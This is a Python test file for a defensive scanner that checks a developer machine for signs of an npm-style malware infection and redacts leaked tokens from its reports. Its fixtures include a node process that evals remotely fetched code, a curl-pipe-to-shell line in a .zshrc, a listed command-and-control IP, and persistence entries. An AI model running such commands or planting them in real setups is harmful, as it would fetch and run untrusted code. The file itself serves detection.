from __future__ import annotations

from collections.abc import Sequence
from pathlib import Path

from devguard_mcp.machine import Probe, check_machine
from devguard_mcp.models import Severity

NODE_RUNNER = (
    '4242 /home/u/.nvm/versions/node/v24/bin/node -e "use strict"; (function(){'
    "try{ eval(dec(await get('/0x/cls'))) }catch{} })();"
)


def make_probe(home: Path, system: str = "Linux", **outputs: str) -> Probe:
    def run(args: Sequence[str]) -> str:
        return outputs.get(args[0], "")

    return Probe(home=home, system=system, run=run)


def rule_ids(report) -> set[str]:  # type: ignore[no-untyped-def]
    return {f.rule_id for f in report.findings}


def test_clean_machine(tmp_path: Path) -> None:
    probe = make_probe(tmp_path, ps="1 /sbin/init\n2 /usr/bin/node server.js\n")
    assert check_machine(probe).findings == []


def test_runner_files_are_critical(tmp_path: Path) -> None:
    runner = tmp_path / ".node_modules"
    runner.mkdir()
    (runner / ".npm-ws-runner.js").write_text("x")
    report = check_machine(make_probe(tmp_path))
    assert "DG-MC-001" in rule_ids(report)
    assert report.worst is Severity.CRITICAL


def test_bare_home_node_modules_dir_is_only_medium(tmp_path: Path) -> None:
    (tmp_path / ".node_modules").mkdir()
    (finding,) = check_machine(make_probe(tmp_path)).findings
    assert finding.severity is Severity.MEDIUM


def test_node_eval_process_with_eval_is_critical(tmp_path: Path) -> None:
    report = check_machine(make_probe(tmp_path, ps=NODE_RUNNER))
    (finding,) = report.findings
    assert finding.rule_id == "DG-MC-002"
    assert finding.severity is Severity.CRITICAL
    assert len(finding.evidence or "") < 200


def test_shell_command_that_merely_mentions_node_e_is_not_flagged(tmp_path: Path) -> None:
    # Regression: the scanner's own invoking shell used to match itself.
    shell = "777 /bin/zsh -c grep 'node -e' file && eval $(something) | node -e x"
    assert check_machine(make_probe(tmp_path, ps=shell)).findings == []


def test_plain_node_eval_without_runner_behaviour_is_not_flagged(tmp_path: Path) -> None:
    assert (
        check_machine(make_probe(tmp_path, ps="9 /usr/bin/node -e console.log(1)")).findings == []
    )


def test_connection_to_known_c2_is_critical(tmp_path: Path) -> None:
    lsof = "node 1 u 14u IPv4 0x1 0t0 TCP 10.0.0.2:5555->95.135.181.151:443 (ESTABLISHED)"
    report = check_machine(make_probe(tmp_path, lsof=lsof))
    assert rule_ids(report) == {"DG-MC-003"}


def test_similar_looking_ip_is_not_a_match(tmp_path: Path) -> None:
    lsof = "TCP 10.0.0.2:5->195.135.181.1519:443"
    assert check_machine(make_probe(tmp_path, lsof=lsof)).findings == []


def test_macos_launch_agent_referencing_runner_is_high(tmp_path: Path) -> None:
    agents = tmp_path / "Library/LaunchAgents"
    agents.mkdir(parents=True)
    (agents / "com.evil.plist").write_text(
        "<string>/Users/u/.node_modules/.npm-ws-runner.js</string>"
    )
    report = check_machine(make_probe(tmp_path, system="Darwin"))
    assert "DG-MC-004" in rule_ids(report)


def test_crontab_entry_is_flagged(tmp_path: Path) -> None:
    report = check_machine(make_probe(tmp_path, crontab="@reboot node -e 'x'"))
    assert "DG-MC-004" in rule_ids(report)


def test_windows_scheduled_task_is_flagged(tmp_path: Path) -> None:
    probe = make_probe(tmp_path, system="Windows", schtasks="Task,node -e ..., .node_modules")
    assert "DG-MC-004" in rule_ids(check_machine(probe))


def test_shell_rc_pipe_to_shell_is_flagged(tmp_path: Path) -> None:
    (tmp_path / ".zshrc").write_text("export A=1\ncurl -fsSL https://x.example/i | sh\n")
    assert "DG-MC-005" in rule_ids(check_machine(make_probe(tmp_path)))


def test_token_in_history_is_reported_redacted(tmp_path: Path) -> None:
    token = "ghp_" + "b" * 36
    (tmp_path / ".zsh_history").write_text(f"git clone https://{token}@github.com/o/r.git\n")
    (finding,) = check_machine(make_probe(tmp_path)).findings
    assert finding.rule_id == "DG-CR-001"
    assert token not in (finding.evidence or "")
    assert token not in finding.message


def test_report_always_carries_a_no_proof_note(tmp_path: Path) -> None:
    assert any("cannot prove" in n for n in check_machine(make_probe(tmp_path)).notes)
